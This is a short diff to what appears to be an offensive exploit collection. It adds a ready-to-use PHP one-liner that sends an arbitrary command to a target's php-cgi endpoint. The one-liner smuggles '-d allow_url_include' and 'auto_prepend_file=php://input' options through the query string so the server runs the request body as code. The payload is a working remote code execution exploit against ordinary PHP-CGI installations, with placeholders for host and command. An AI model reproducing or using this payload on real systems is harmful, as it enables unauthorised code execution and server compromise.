@@ -1474,6 +1474,12 @@ else:
     print('(!) Exploit may have failed')
 ```
 
+### Oneliner
+
+```php
+$ php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'<COMMAND>']]);file_get_contents('http://<RHOST>/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
+```
+
 ## CVE-2024-20656: Visual Studio VSStandardCollectorService150 Service LPE
 
 > https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/
